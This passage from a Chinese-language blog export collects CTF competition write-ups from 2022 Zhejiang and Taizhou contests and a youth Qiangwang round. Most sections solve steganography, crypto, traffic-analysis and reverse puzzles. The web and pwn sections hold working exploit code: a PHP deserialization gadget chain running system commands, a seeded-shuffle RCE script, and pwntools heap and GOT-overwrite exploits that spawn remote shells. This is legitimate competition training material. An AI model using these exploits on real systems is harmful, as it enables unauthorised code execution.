requests\n\nurl=\"http://80.endpoint-ab681a0db3214901a65a00b23c616372.dasc.buuoj.cn:81/?passwd=123&dir=glob:///tmp/hint\"\nb='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\ndata=\"\"\nfor i in range(10):\n    for j in b:\n        r=requests.get(url+data+j+'*')\n        if '0' in r.text:\n            data=data+j\n            break\n    print(data)\nprint(data)\n```\n\n\n![](/img/wp/2022//2022taizhou-9.png)\n\n\n拿到passwd：`st1sOFAblF`，进行rce\n\n![](/img/wp/2022//2022taizhou-10.png)\n\n\n\n### ezGadget01 ###\n\n*赛后复现*\n\n```php\n<?php\n\nclass Ez\n{\n    function __construct()\n    {\n\n    }\n    function __destruct()\n    {\n        $this->run();\n    }\n    function run()\n    {\n        echo \"exit\";\n    }\n}\n\nclass Junit\n{\n    private $judge;\n    function __construct()\n    {\n        $this->judge = False;\n    }\n\n    function e($arguments)\n    {\n        if($this->judge)\n        {\n            eval(implode(\", \", $arguments));\n        }\n    }\n}\n\nclass Ez1\n{\n    function __construct()\n    {\n\n    }\n    function __destruct()\n    {\n        $this->get();\n    }\n    function get()\n    {\n        echo \"get\";\n    }\n}\n\nclass Space\n{\n    protected $name;\n    function __construct($name)\n    {\n        $this->name = $name;\n    }\n    function __wakeup()\n    {\n        echo \"My name is \" . $this->name;\n    }\n}\n\nclass CallFunction\n{\n    private $num;\n    public $func;\n    function __construct()\n    {\n        $this->num = 5;\n    }\n\n    function __call($function, $arguments)\n    {\n        if($this->num > 10)\n        {\n            call_user_func($this->func, $arguments);\n        }\n    }\n}\n\nclass chain\n{\n    private $name;\n    function __construct($name)\n    {\n        $this->name = $name;\n    }\n    function __set($func, $name)\n    {\n        echo $func;\n    }\n}\n\nclass Proc01\n{\n    public $param;\n    function __construct()\n    {\n        $this->param = \"whoami\";\n    }\n    function __toString()\n    {\n        if(isset($this->param))\n        {\n            system(\"whoami\");\n        }\n        return $this->param->arg;\n    }\n}\n\nclass SetName\n{\n    private $app;\n    protected $args;\n    function __construct()\n    {\n\n    }\n    function __isset($name)\n    {\n        $this->app->list($this->args);\n    }\n}\n\nclass GetName\n{\n    private $app;\n    protected $args;\n    function __construct()\n    {\n\n    }\n    function __get($name)\n    {\n        $this->app->list($this->args);\n    }\n}\n\n\nif(isset($_GET['b']))\n{\n    unserialize(base64_decode($_GET['b']));\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n```\n\n在`Junit`类中存在`e`方法会执行`eval`函数\n可以利用`CallFunction`类中的`__call`方法调用`Junit`类中`e`方法\n利用`GetName`类中的`__get`方法触发`CallFunction`类中的`__call`方法\n利用`Proc01`类中的`__toString`方法触发`GetName`类中的`__get`方法\n利用`Space`类中的`__wakeup`方法触发`Proc01`类中的`__toString`方法\n\n调用顺序:`Space->Proc01->GetName->CallFunction->Junit`\n\n\n```php\n<?php\nclass Junit\n{\n    private $judge;\n    function __construct()\n    {\n        $this->judge = True;\n    }\n}\n\n\nclass CallFunction\n{\n    private $num;\n    public $func;\n    function __construct()\n    {\n        $this->num=20;\n        $this->func=[new Junit(),\"e\"];\n    }\n}\n\nclass GetName\n{\n    private $app;\n    protected $args;\n    function __construct()\n    {\n        $this->app=new CallFunction();\n        $this->args=\"system('ls');\";\n    }\n}\n\nclass Proc01\n{\n    public $param;\n    function __construct()\n    {\n       $this->param=new GetName();\n    }\n}\n\nclass Space\n{\n    protected $name;\n    function __construct()\n    {\n        $this->name=new Proc01();\n    }\n}\n\n$a=new Space();\necho base64_encode(serialize($a));\n```\n\n![](/img/wp/2022//2022taizhou-11.png)\n\n\n\n# 决赛 #\n\n疫情原因线上awd。Rank: 2\n\n","tags":["awd","wp","台州","2022竞赛"],"categories":["wp"]},{"title":"第五届浙江省大学生网络与信息安全竞赛决赛-WP","url":"/posts/780baaa1/","content":"\n\n\n# Web #\n\n## ezphp ##\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nmt_srand(time());\n$a = array(\"system\",$_GET['cmd']);\nfor ($i=0;$i<=10000;$i++){\n    array_push($a,\"Ctfer\");\n}\nshuffle($a);\n$a[$_GET['b']]($a[$_GET['c']]);\n```\n\n因为`shuffle`函数使用伪随机数产生器，所以当时间戳相同时，两个相同数组打乱后产生的两个新数组也相同\n\n\n\n在本地编写php代码，获取索引值\n\n```php\n<?php\nerror_reporting(0);\nmt_srand($_GET['a']);\n\n$a = array(\"system\",$_GET['cmd']);\nfor ($i=0;$i<=10000;$i++){\n    array_push($a,\"Ctfer\");\n}\nshuffle($a);\n\nfor ($i=0;$i<=10003;$i++){\n    if ($a[$i] == 'system'){\n        print_r('system:'.$i.\"\\n\");\n    }\n    if ($a[$i] == $_GET['cmd']){\n        print_r('cmd:'.$i.\"\\n\");\n    }\n}\n```\n\n将本地获取到的索引值传入靶机，成功rce\n\n```python\nimport requests\nimport time\nimport re\nwhile True:\n    cmd=raw_input(\">>\").replace(\" \",'%20');\n    t=int(time.time())\n    d=requests.get('http://172.29.17.232/index.php?a=%s&cmd=%s'%(int(t),cmd)).text\n\n    system=int(re.findall('system:(\\d+)',d)[0])\n    c=int(re.findall('cmd:(\\d+)',d)[0])\n\n    d=requests.get('http://80.endpoint-d9deec0835844de5831e550ffe384d16.dasc.buuoj.cn:81/?cmd=%s&c=%s&b=%s'%(cmd,c,system))\n    print(d.text.split('</code>')[1])\n```\n\n\n![](/img/wp/2022/2022zhejiang-final-1.png)\n\n\n\n## babysql ##\n\n过滤了空格，用`/**/`代替\n\n![](/img/wp/2022/2022zhejiang-final-2.png)\n\n\n\n\n# misc #\n\n## checkin_gift ##\n\n两张图片中间拿到`Gift from glzjin: FIWOIxqEZyIWJwIHG01ZDxqMZ1EUGycHGHHlERqnDyAUDyERHH9PI0qOZ0EWGIcEGIxlESSAGREAHGWUF05RAD== Have a nice time, Bye!`\n\n先凯撒位移13位\n\n`SVJBVkdRMlVJWjVUT01MQkdZM1RHTlpUTUUyREdaQlNHQlREUU9CV0dBM0RJTVpRTVkyRFFNTERNUTJHS05ENQ==`\n\nbase64\n\n`IRAVGQ2UIZ5TOMLBGY3TGNZTME2DGZBSGBTDQOBWGA3DIMZQMY2DQMLDMQ2GKND5`\n\nbase32\n\n`DASCTF{71a67373a43d20f88606430f481cd4e4}`\n\n\n## m4a ##\n\n在文件结尾发现一个被反转的压缩包，提取出来一个带密码的压缩包\n\n添加后缀`mp4`发现存在摩斯\n\n`-... .- ....- ...-- -... -.-. . ..-. -.-. ..--- ----- ....-`\n\n得到压缩包密码`BA43BCEFC204`\n\n解压得到\n`(+w)v&LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN`\n\nrot47\n\n`WZHXGU{5v0u98z95u79829y7z484z54066xy08u}`\n\n\natbash\n\n`dasctf{5e0f98a95f79829b7a484a54066cb08f}`\n\n![](/img/wp/2022/2022zhejiang-final-3.png)\n\n\n\n## Unkn0wnData ##\n\n*赛后复现*\n\n\n附件结尾存在一串base64字符串\n\n\n`V2hlcmUxc0tleT8KCu2gve25g+2gve2yte2gvO28v+2gvO2+pO2gve26qu2gvO28j+2gve2wju2gvu21i+2gve26q+2gve24huKche2gvO29je2gvO2+pO2gve2wmO2gvO28j+KEueKMqO2gve24je2gvO2+iOKcie2gvu20o+2gve27qe2gvO29jO2gve26qu2gvO29tOKEueKYuu2gve26ueKdk+2gvO29tO2gve20rO2gvO28qu2gvO29te2gve2xo+2gve20hOKYg+2gve2xjO2gve24ju2gve2xjO2gve20hO2gve2xjO2gve20qu2gvO29jO2gve2xge2gvO29je2gvO29jO2gvO28j+2gvO2+g+2gve26sO2gvO29te2gve2wje2gvO2+heKche2gvO29je2gvu22k+2gve24ju2gve24iu2gvu20o+2gvO2/ue2gvO29je2gve2yp+2gve20hO2gve20hO2gvu20o+2gve2xge2gvu21i+2gve26q+KYuu2gvO29tO2gve24ge2gve26q+2gve24h+2gve26sOKPqe2gve24je2gvO28v+2gve2yte2gvu22k+2gve24h+2gve27qeKclu2gve21ue2gve2wju2gve2zgu2gve2zgu2gve2yp+2gve23ku2gve23kg==`\n\n解密后用`UTF-8`编码显示\n\n![](/img/wp/2022/2022zhejiang-final-4.png)\n\n\nstegsolve分析图片，0通道中发现一个压缩包\n\n解压得到key.txt\n\n```text\ndata:\n0000100000000000\n00000c0000000000\n00000e0000000000\n00002a0000000000\n0000100000000000\n0000040000000000\n0000080000000000\n00002a0000000000\n0000160000000000\n00000b0000000000\n00000c0000000000\n00001c0000000000\n00002a0000000000\n00002c0000000000\n0200340000000000\n00002a0000000000\n0200090000000000\n00000c0000000000\n0000110000000000\n0000070000000000\n0200170000000000\n00002a0000000000\n0200170000000000\n00000b0000000000\n0000080000000000\n0000120000000000\n00002a0000000000\n0200150000000000\n0000080000000000\n0000040000000000\n00000f0000000000\n00000a0000000000\n00002a0000000000\n02000e0000000000\n0000080000000000\n00001c0000000000\n00000a0000000000\n00002a0000000000\n0000040000000000\n0000110000000000\n0000070000000000\n00000f0000000000\n00002a0000000000\n0200100000000000\n0000040000000000\n00000e0000000000\n0000080000000000\n0000080000000000\n00002a0000000000\n02000c0000000000\n0000170000000000\n02001e0000000000\n0000070000000000\n00002a0000000000\n```\n\n明显的USB键盘流量\n\n使用脚本提取出来\n\n```python\n#!/usr/bin/env python\n\nimport sys\nimport os\n\nDataFileName = \"usb.dat\"\n\npresses = []\n\nnormalKeys = {\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"<RET>\",\"29\":\"<ESC>\",\"2a\":\"<DEL>\", \"2b\":\"\\t\",\"2c\":\"<SPACE>\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"<NON>\",\"33\":\";\",\"34\":\"'\",\"35\":\"<GA>\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"<CAP>\",\"3a\":\"<F1>\",\"3b\":\"<F2>\", \"3c\":\"<F3>\",\"3d\":\"<F4>\",\"3e\":\"<F5>\",\"3f\":\"<F6>\",\"40\":\"<F7>\",\"41\":\"<F8>\",\"42\":\"<F9>\",\"43\":\"<F10>\",\"44\":\"<F11>\",\"45\":\"<F12>\"}\n\nshiftKeys = {\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"<RET>\",\"29\":\"<ESC>\",\"2a\":\"<DEL>\", \"2b\":\"\\t\",\"2c\":\"<SPACE>\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"<NON>\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"<GA>\",\"36\":\"<\",\"37\":\">\",\"38\":\"?\",\"39\":\"<CAP>\",\"3a\":\"<F1>\",\"3b\":\"<F2>\", \"3c\":\"<F3>\",\"3d\":\"<F4>\",\"3e\":\"<F5>\",\"3f\":\"<F6>\",\"40\":\"<F7>\",\"41\":\"<F8>\",\"42\":\"<F9>\",\"43\":\"<F10>\",\"44\":\"<F11>\",\"45\":\"<F12>\"}\n\ndef main():\n    # read data\n    with open('key.txt', \"r\") as f:\n        for line in f:\n            presses.append(line[0:-1])\n    # handle\n    result = \"\"\n    for press in presses:\n        if press == '':\n            continue\n        if ':' in press:\n            Bytes = press.split(\":\")\n        else:\n            Bytes = [press[i:i+2] for i in range(0, len(press), 2)]\n        if Bytes[0] == \"00\":\n            if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]):\n                result += normalKeys[Bytes[2]]\n        elif int(Bytes[0],16) & 0b10 or int(Bytes[0],16) & 0b100000: # shift key is pressed.\n            if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]):\n                result += shiftKeys[Bytes[2]]\n        else:\n            print(\"[-] Unknow Key : %s\" % (Bytes[0]))\n    print(\"[+] Found : %s\" % (result))\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n得到`mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d<DEL>`\n\n去掉删除的字符应该是`mimashi FindTheRealKeyandMakeIt!`，但是这句话的意思让我们找到真正的key，所以这个应该是假的key\n\n仔细观察删掉的字符，发现正好是key开头，提取出来得到`key:Toggled`\n\n\nemoji-aes解密得到flag\n\n\n## hard_Digital_plate ##\n\n*赛后复现*\n\n\n`foremost`可以分离出一张图片，根据名字猜测是`oursecret`隐写\n\n\n流量分析，发现是数位板流量\n\ntshark提取\n`tshark -r hard_Digital_plate.pcapng -T fields -e usbhid.data | sed '/^\\s*$/d' > out.txt`\n\n\npython提取坐标\n```python\nnums = []\nkeys = open('out.txt', 'r')\nresult = open('result.txt', 'w')\nfor line in keys:\n    if int(line[12:16], 16) == 0:\n        continue\n    x = int(line[4:6], 16) + int(line[6:8], 16) * 0xff\n    y = int(line[8:10], 16) + int(line[10:12], 16) * 0xff\n    result.write(str(x)+' '+str(-y)+'\\n')\nkeys.close()\nresult.close()\n```\n\n`gnuplot`画图\n\n![](/img/wp/2022/2022zhejiang-final-5.png)\n\n得到`oursecret`密码`kfae5y4wi2shwj81y2kda6ax7x`\n\n解一下`oursecret`，拿到`U2FsdGVkX18jQgWzhln3pPiVK8gaBxIzhY1JWcFlKiRdBkV/jDmEBxJV9PZmwBJ7MU3IdNf4hWryZLYRLuxA4w==`\n\n\n图片备注中看到`糟糕，好像有几个字写的太轻了，看不清楚`\n\n提取低压感数据，以`0xf000`作为压感临界值\n\n```python\nnums = []\nkeys = open('out.txt', 'r')\nresult = open('result.txt', 'w')\nfor line in keys:\n    if int(line[12:16], 16) == 0:\n        continue\n    x = int(line[4:6], 16) + int(line[6:8], 16) * 0xff\n    y = int(line[8:10], 16) + int(line[10:12], 16) * 0xff\n    if int(line[12:16], 16) < 0xf000:\n        result.write(str(x)+' '+str(-y)+'\\n')\nkeys.close()\nresult.close()\n```\n\n`gnuplot`画图\n\n![](/img/wp/2022/2022zhejiang-final-6.png)\n\n\n得到`key`：`w12kax`\n\n\naes解密\n\n![](/img/wp/2022/2022zhejiang-final-7.png)\n\n\n# reverse #\n\n## ezandroid ##\n\n先安装apk，随意输入一个值，返回`error！`\n\n\njadx中搜索关键字，得到判断代码\n\n```java\nList<Integer> ccompare = new ArrayList(Arrays.asList(this.compare));\nInteger[] compare = {404, 220, 436, 368, 220, 436, 412, 452, 432, IntegvalueOf((int) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION412};\nString mname = \"ccadwjlyah\";\n```\n\n```java\npublic void onClick(View v) {\n    String user = MainActivity.this.name.getText().toString().trim();\n    List<Integer> ppwd = MainActivity.change(MainActivity.this.pass.getT().toString().trim());\n    if (!user.equals(this.mname) || !ppwd.equals(this.ccompare)) {\n        Toast.makeText(MainActivity.this, \"error！\", 0).show();\n        return;\n    }\n    Toast.makeText(MainActivity.this, \"correct！\", 0).show();\n    MainActivity.this.startActivity(new Intent(MainActivity.this, afterlclass));\n}\n```\n\n加密函数\n\n```java\npublic static List<Integer> change(String args) {\n    char[] ch;\n    List<Integer> list = new ArrayList<>();\n    for (char c : args.toCharArray()) {\n        list.add(Integer.valueOf((c ^ 3) << 2));\n    }\n    return list;\n}\n```\n\n用户名明文存储，是`ccadwjlyah`\n\n\n程序会对输入后的密码加密然后与程序中的`compare`变量比较\n\n获取`compare`数组的值，其中有一个成员存储在变量中\n\n![](/img/wp/2022/2022zhejiang-final-8.png)\n\n\n解密脚本\n```python\na=[404, 220, 436, 368, 220, 436, 412, 452, 432, 200, 412]\ne=''\nfor i in a:\n    e+=chr((i>>2)^3)\nprint(e)\n```\n\n得到密码`f4n_4ndro1d`\n\n\n![](/img/wp/2022/2022zhejiang-final-9.png)\n\n赛后发现的一个非预期：因为最后flag是存储在图片中的，所以直接把apk当压缩包解压，去找图片也能看到flag\n\n\n# crypto #\n\n## math ##\n\n因为加密代码`(str.index(i)*key+7)%37`中取余了37，所以key的值可以认为在0~37的范围内\n\n直接爆破\n```python\na='u66hp7nuh01puoaip10pi6o0vzavnu11'\ns='abcdefghijklmnopqrstuvwxyz0123456789+='\nfor i in range(37):\n    e=''\n    for n in range(len(a)):\n        for j in range(len(s)):\n            if s[((j*i)+7)%37]==a[n]:\n                e=e+s[j]\n                break\n    print(e)\n```\n\n爆破出37串字符串，只有一串字符串满足flag格式，即32位十六进制字符串\n\n![](/img/wp/2022/2022zhejiang-final-10.png)\n\nflag: `799a03b7a82076f5028059681df1b722`\n","tags":["wp","2022竞赛","浙江"],"categories":["wp"]},{"title":"第五届浙江省大学生网络与信息安全竞赛初赛-WP","url":"/posts/f203fa52/","content":"\n\n# 战队信息 #\n\nRml\n\nRank: 32\n\n\n# 解题过程 #\n\n\n## Web ##\n\n### nisc_easyweb ###\n\n访问`/robots.txt`，发现`/api/record`，访问后到`/test_api.php`，F12得到`i=FlagInHere`，按题目要求get传参拿到flag\n\n\n\n\n### nisc_学校门户网站 ###\n\n访问学生系统，任意注册一个用户进入系统拿到flag\n\n\n\n### 吃豆人吃豆魂 ###\n\n在index.js中搜到失败返回值，成功返回值就在上一行\n\n![](/img/wp/2022/2022zhejiang-1.png)\n\nbase64解密拿到flag\n\n`REFTQ1RGe2YyMzViMDIzODJhMjIzZmRhNGNlMmVjNjIxNDhkOTRjfQ==`\n\n`DASCTF{f235b02382a223fda4ce2ec62148d94c}`\n\n\n\n## PWN ##\n\n### babyheap ###\n\n因为程序存在`uaf`，所以连续释放两个`chunk`，可以获取`heap段地址`，这样可以计算出`tcache bin`的地址\n\n通过覆盖`tcache bin`的值，在任意地址放置`chunk`，设置`chunk0`的`size`为`0x430`，并在`chunk0+0x430`的位置处构造两个`0x20`字节的`chunk` 释放`chunk0`，获取`libc`地址，再利用`tcache bin`，可以以最少的`chunk`数，在`free_hook`中写入`system`函数地址\n\n再次执行`free`函数调用`system(\"/bin/sh\")`\n\n\n```python\nfrom pwn import *\n\ndef add(size):\n    p.sendlineafter('choice:','1')\n    p.sendlineafter('size:',str(size))\n\ndef edit(ind,data):\n    p.sendlineafter('choice:','2')\n    p.sendlineafter('index:',str(ind))\n    p.sendafter('content:',data)\n\ndef show(ind):\n    p.sendlineafter('choice:','3')\n    p.sendlineafter('index:',str(ind))\n\ndef free(ind):\n    p.sendlineafter('choice:','4')\n    p.sendlineafter('index:',str(ind))\n\nlibc=ELF('./libc-2.27.so',checksec=0)\np=remote('1.14.97.218','27188')\n#p=process('./babyheap')\n#gdb.attach(p)\nadd(0x58) #0\nadd(0x58) #1\n\nfree(0)\nfree(1)\nshow(1)\n\np.readuntil(' \\n')\nd=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nprint(hex(d))\nheap=d&0xfffffffffffff000+0x70\nedit(1,p64(heap))\nadd(0x58) #2\nadd(0x58) #3\nedit(3,p64(0)*2+p64(d-0x10)+p64(d-0x10+0x430))\nadd(0x58) #4\nadd(0x68) #5\nedit(5,p64(0x0)+p64(0x21)+p64(0)*3+p64(0x21))\nedit(4,p64(0)+p64(0x431))\nfree(0)\nshow(0)\np.readuntil(' \\n')\nd=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nmalloc_hook=d-0x60-0x10\nlibc.address=malloc_hook-libc.sym['__malloc_hook']\nsystem=libc.sym['system']\nfree_hook=libc.sym['__free_hook']\nedit(3,p64(0)*2+p64(free_hook))\nedit(1,b'/bin/sh\\x00')\nadd(0x58) # 6\nedit(6,p64(system))\npause()\nfree(1)\np.interactive()\n```\n\n![](/img/wp/2022/2022zhejiang-2.png)\n\n\n### new_stack ###\n\n*赛后复现*\n\n`main`函数\n\n![](/img/wp/2022/2022zhejiang-3.png)\n\n\n后门函数\n\n![](/img/wp/2022/2022zhejiang-4.png)\n\n\n后门函数会将我们输入的数据写入栈中，刚好最后`8字节`可以修改`X29寄存器`的值，而这个寄存器在程序中是用来临时储存函数第一个参数的寄存器，会用来修改`X0寄存器`，刚好在后门函数结束后会执行一次输入输出，这时可以通过修改`got表`控制程序流程\n\n\n```python\nfrom pwn import *\np=remote('10.201.15.180',4444)\nlibc=ELF('./libc.so.6',checksec=0)\ne=ELF('./pwn1',checksec=0)\nread_1=0x4007f4\nret=0x400834\nputs_got=e.got['puts']\nputs=0x400590\nread=0x400590\nbss=e.bss(0x100)\np.readuntil('name')\np.send(b'a'*0x10+p64(puts_got-0x18))\np.readuntil('go')\np.send(p64(read_1)+p64(read)+p64(ret))\np.send(p64(puts))\n# 因为正常输出会输出puts函数对应got表项中的数值\n# 这时利用程序的延迟绑定技术，会使puts函数对应got表项中储存真实的puts函数地址\n# 可以用来获取libc地址\nd=(u64(p.readuntil(\"\\nlet's go\",drop=1).ljust(0x8,b'\\x00'))>>8)\nprint(hex(d))\nlibc.address=d-libc.sym['puts']\nprint(hex(libc.address))\nsystem=libc.sym['system']\np.send(p64(read_1)+p64(read)+p64(ret))\np.send(p64(system)+p64(read)+p64(0x4007f0))\n# 先通过 LDP  X29, X30, [SP+0x30+var_30],#0x30 指令设置X29的值为栈中的数值\n# 并将puts函数设置为system\n# 这时向栈中写入/bin/sh ，在执行puts函数时就会执行system(\"/bin/sh\");\np.interactive()\n```\n![](/img/wp/2022/2022zhejiang-5.png)\n\n\n## RE ##\n\n### ManyCheck ###\n\n程序在`check1`中会检测输入是否等于77\n\n![](/img/wp/2022/2022zhejiang-6.jpg)\n\n在`check2`中输入的第一个数字的平方要等于3025，第二个数的平方要等于2401\n\n![](/img/wp/2022/2022zhejiang-7.jpg)\n\n根据`reshort16`函数得知，将`check3`输入的数字的高两个字节和低两个字节调换位置后要等于`0x66744769`\n\n![](/img/wp/2022/2022zhejiang-8.jpg)\n\n![](/img/wp/2022/2022zhejiang-9.jpg)\n\n按要求输入完四个数字拿到flag\n\n![](/img/wp/2022/2022zhejiang-10.png)\n\n\n\n\n## MISC ##\n\n### 好怪哦 ###\n\n先将文件反转一下\n\n```python\nwith open('fuck.zip','rb') as f:\n\n   with open('1.zip','wb') as g:\n\n      g.write(f.read()[::-1])\n```\n\n`flag.png`少了文件头，补上`89 50 4e 47`\n\ncrc报错，修改下高度拿到flag\n\n\n### 神奇的棋盘 ###\n\n*赛后复现*\n\nlsb查看0通道，发现一串加密字符，base32解密得到`LastKey{Yusayyds}`\n\n\n首先是波利比奥斯方阵密码\n\n手搓或者脚本\n\n![](/img/wp/2022/2022zhejiang-11.png)\n\n```python\na='11,22,11,53,53,14,11,22,22,51,22,22,51,14,51,11,14,11,51,53,14,22,11,14,51,22,14,51,11,11,14,14,14,14,21,53,11,21,11,21,14,22,14,51,53,53,14,22,22,14,22,22,14,53,14,14,21,14,14,53,51,22,53,11,14,22,51,14,21,53,51,51,11,11,14,14,53,14,53,53,11,14,14,51,22,22,22,53,22,53,53,53,53,22,53,53,22,22,53,22,14,51,51,51,22,22,22,11,22,11,11,11,11,22,11,11,22,22,11,22,14,14,14,11,22,11,22,22,22,11,22,22,11,22,11,22,11,11,11,51,11,11,11,53,22,53,22,22,22,53,22,22,53,22,53,22,53,53,53,51'\na=a.split(',')\nt=\"ABCDEFGHIKLMNOPQRSTUVWXYZ\"\nn=''\nfor i in a:\n    n=n+t[(int(i[0])-1)*5+int(i[1])-1]\nprint(n)\n```\n\n![](/img/wp/2022/2022zhejiang-12.png)\n\n得到`AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV`\n\n加上key解`ADFGVX`密码\n\n![](/img/wp/2022/2022zhejiang-13.png)\n\n\n`4441534354467b64383539633431633533306166633163316164393461626439326634626166387d`\n\n十六进制转字符串得到flag\n\n\n### segmentFlow ###\n\n*赛后复现*\n\n文件很小，直接crc爆破\n\n![](/img/wp/2022/2022zhejiang-14.png)\n\n得到解压密码`gZinflAte_BasE64`\n\n![](/img/wp/2022/2022zhejiang-15.png)\n\n\n\n追踪流，发现`sa066b32bfb3e7`的值在传递`zip`文件\n\n\n![](/img/wp/2022/2022zhejiang-16.png)\n\ntshark提取出来\n\n`tshark -r segmentFlow.pcapng -Y \"http.request\" -T fields -e http.file_data > data.txt`\n\n提取压缩包部分\n\n```python\nf=open('data.txt','r')\nf1=open(\"data.zip\",\"wb\")\ndata=f.read()\ndata=data.split('&sa066b32bfb3e7=')\nfor i in range(1,len(data)):\n    print(data[i][:8],end='')\n    f1.write(bytes.fromhex(data[i][:8]))\n```\n\n解压得到flag","tags":["wp","2022竞赛","浙江"],"categories":["wp"]},{"title":"强网杯青少年杯初赛wp","url":"/posts/2ef8c529/","content":"\n# 战队信息 #\n战队名称：Rml\n战队排名：5\n\n\n# 解题情况 #\n\n![](/img/wp/2022/2022qwbqsn-1.png)\n\n\n# 解题过程 #\n\n## web ##\n\n### web1 ###\nCVE-2021-41773，payload直接打\n\n![](/img/wp/2022/2022qwbqsn-2.png)\n\n\n\n\n\n\n## misc ##\n\n### misc1 ###\nbase64解密后得到一张图片，但是每两个字节被换了位置\n\n修复脚本\n```python\nf=open('a.png','rb')\nf1=open('b.png','wb')\n\ndata=f.read()\nfor i in range(0,len(data),2):\n    f1.write(data[i:i+2][::-1])\n```\n\n得到hint`密钥就是音乐的财富密码`，加上题目描述`你知道万能和弦是什么吗?`，得到`4536251`\n\nlsb解密得到flag\n\n![](/img/wp/2022/2022qwbqsn-3.png)\n\n\n### misc2 ###\n\n*赛后复现*\n\n祥云杯`shuffle_code`的后半部分\n\n\n按行打乱了\n网上的爆破脚本\n```python\ndata = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1],[1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1],[0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1],[1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1],[1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1],[0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1],[1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1],[1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0],[0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0],[1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1],[0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1],[1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0],[1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1],[1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1],[1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],[0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0],[1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0],[1,0,0,0,0,